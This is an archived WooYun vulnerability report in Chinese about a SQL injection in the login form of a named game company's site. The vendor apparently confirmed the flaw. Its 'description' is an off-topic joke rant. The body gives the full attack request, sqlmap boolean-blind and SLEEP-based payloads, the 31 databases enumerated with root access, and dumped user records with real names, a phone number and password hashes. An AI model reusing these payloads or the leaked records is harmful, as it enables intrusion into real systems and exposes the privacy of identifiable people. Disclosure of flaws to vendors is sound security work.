{"id": 28674, "wybug_id": "wooyun-2015-0121660", "wybug_title": "超级玩家某处注入二（31库  root权限）", "wybug_corp": "超级玩家", "wybug_author": "天地不仁 以万物为刍狗", "wybug_date": "2015-06-19 17:43", "wybug_open_date": "2015-08-08 15:04", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["第三方不可信程序"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-06-19：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-06-24：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-07-04：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-07-14：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-07-24：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-08-08：\t细节向公众公开  简要描述： 我觉得喜羊羊是部暴恐 弱智动漫 应该让文化菊进行封杀 严重影响小孩子的身心发展 说它是暴恐 第一 狼要吃羊 作为一只生活在法律社会的狼 怎么可以吃羊呢？太凶残了 第二 狼每次吃不到羊 就会动手做各种武器 去捉羊 比如 大炮啊 之类的 这不教坏孩子去打架 打不过就用武器嘛？ 这动漫之凶残 令人发指 简直不可饶恕 第三 灰太狼捉不到羊 红太狼就会用平底锅砸灰太狼 这是在赞同家庭暴力吗？文化菊菊长 你们就是这么教育下一代的？说它是部弱智动漫 因为狼从第一集开始 到现在 特码都多少集了 一只羊都没抓不到 这不是弱智动漫吗？ 详细说明：  POST数据包：\nPOST /index.php/Index/login HTTP/1.1Host: jf.lianyun.chinasg.comUser-Agent: Mozilla/5.0 (Windows NT 6.1; rv:33.0) Gecko/20100101 Firefox/33.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: zh-cn,zh;q=0.8,en-us;q=0.5,en;q=0.3Accept-Encoding: gzip, deflateReferer: http://jf.lianyun.chinasg.com/index.php/Index/loginCookie: PHPSESSID=l31bqvk8rh8d85qr0cr5hkatj6X-Forwarded-For: 8.8.8.8'Connection: keep-aliveContent-Type: application/x-www-form-urlencodedContent-Length: 72username=admin&password=admin&verifycode=6667&Submit=%E7%99%BB+%E9%99%86\nusername 参数未过滤 可注入（31个库 具体参数见下图 以及漏洞证明）\n\n\n\n由于数据库太多  就不一一看了 （随便一个库都有几百个表···）\n\n\n\n\n\n顺便看了下权限（root权限）\n\n随便拖了两条 lianyun 里的 web_user  可是很可惜 密码一条都没解开  不然就进后台看看了\n\n这里就不继续深入了···\nDatabase: lianyunTable: web_user[3 entries]+----+-----------+--------+--------+---------------------+---------+-----------+----------------------------------+----------+-------------+| id | create_id | salt   | status | regtime             | address | username  | password                         | realname | cellphone   |+----+-----------+--------+--------+---------------------+---------+-----------+----------------------------------+----------+-------------+| 1  | 1         | 4rt67y | 1      | 2013-08-26 18:49:26 | 武汉超玩    | admin   | a3fddf38b6a6cbf63c18bd063fbc39d8 | 超级管理员    | 027-123456  || 12 | 1         | PDRICB | 1      | 2013-09-12 14:25:11 | <blank> | xuzixiong | 12c67ae99f796a87396ccf526b885cf4 | 徐子雄      | <blank>     || 18 | 1         | HGRFEV | 1      | 2015-02-28 16:15:33 | <blank> | luoxin    | ad957d7529872968605062218f900239 | 罗欣       | 15827191333 |+----+-----------+--------+--------+---------------------+---------+-----------+----------------------------------+----------+-------------+\n   漏洞证明：  \nPOST parameter 'username' is vulnerable. Do you want to keep testing the others(if any)? [y/N] nsqlmap identified the following injection points with a total of 58 HTTP(s) requests:---Parameter: username (POST)    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: username=admin' AND 6964=6964 AND 'XiMC'='XiMC&password=admin&verifycode=6667&Submit=%E7%99%BB %E9%99%86    Type: AND/OR time-based blind    Title: MySQL >= 5.0.12 AND time-based blind (SELECT)    Payload: username=admin' AND (SELECT * FROM (SELECT(SLEEP(5)))PfVe) AND 'LCdk'='LCdk&password=admin&verifycode=6667&Submit=%E7%99%BB %E9%99%86---[17:17:56] [INFO] the back-end DBMS is MySQLweb application technology: Nginxback-end DBMS: MySQL 5.0.12[17:17:56] [INFO] fetching database names[17:17:56] [INFO] fetching number of databases[17:17:56] [WARNING] running in a single-thread mode. Please consider usage of option '--threads' for faster data retrieval[17:17:56] [INFO] retrieved: 31[17:17:57] [INFO] retrieved: information_schema[17:18:13] [INFO] retrieved: bkback[17:18:19] [INFO] retrieved: bkbmbdlog[17:18:28] [INFO] retrieved: jf_1073[17:18:35] [INFO] retrieved: jf_3737k[17:18:43] [INFO] retrieved: jf_7678[17:18:51] [INFO] retrieved: jf_woyou[17:18:59] [INFO] retrieved: lanqiu_1073[17:19:09] [INFO] retrieved: lanqiu_1567[17:19:20] [INFO] retrieved: lanqiu_265g[17:19:30] [INFO] retrieved: lanqiu_31u[17:19:40] [INFO] retrieved: lanqiu_3737k[17:19:51] [INFO] retrieved: lanqiu_511wan[17:20:03] [INFO] retrieved: lanqiu_5qwan[17:20:15] [INFO] retrieved: lanqiu_7678[17:20:25] [INFO] retrieved: lanqiu_798[17:20:34] [INFO] retrieved: lanqiu_baidu[17:20:46] [INFO] retrieved: lanqiu_ftx[17:20:56] [INFO] retrieved: lanqiu_lehihi[17:21:08] [INFO] retrieved: lanqiu_ufojoy[17:21:20] [INFO] retrieved: lanqiu_woyou[17:21:32] [INFO] retrieved: lianyun[17:21:38] [INFO] retrieved: lianyun_1073[17:21:50] [INFO] retrieved: lianyun_31u[17:22:00] [INFO] retrieved: lianyun_3737k[17:22:12] [INFO] retrieved: lianyun_7678[17:22:23] [INFO] retrieved: lianyun_woyou[17:22:35] [INFO] retrieved: mysql[17:22:41] [INFO] retrieved: sg_jinfen[17:22:49] [INFO] retrieved: shenqijf_tmp[17:23:01] [INFO] retrieved: testavailable databases [31]:[*] bkback[*] bkbmbdlog[*] information_schema[*] jf_1073[*] jf_3737k[*] jf_7678[*] jf_woyou[*] lanqiu_1073[*] lanqiu_1567[*] lanqiu_265g[*] lanqiu_31u[*] lanqiu_3737k[*] lanqiu_511wan[*] lanqiu_5qwan[*] lanqiu_7678[*] lanqiu_798[*] lanqiu_baidu[*] lanqiu_ftx[*] lanqiu_lehihi[*] lanqiu_ufojoy[*] lanqiu_woyou[*] lianyun[*] lianyun_1073[*] lianyun_31u[*] lianyun_3737k[*] lianyun_7678[*] lianyun_woyou[*] mysql[*] sg_jinfen[*] shenqijf_tmp[*] test[17:23:05] [INFO] fetched data logged to text files under 'C:\\Users\\Administrator\\.sqlmap\\output\\jf.lianyun.chinasg.com'[*] shutting down at 17:23:05\n   修复方案：     版权声明：转载请注明来源 天地不仁 以万物为刍狗@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：5  确认时间：2015-06-24 15:03 厂商回复： 正在处理 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 5, "Ranks": null}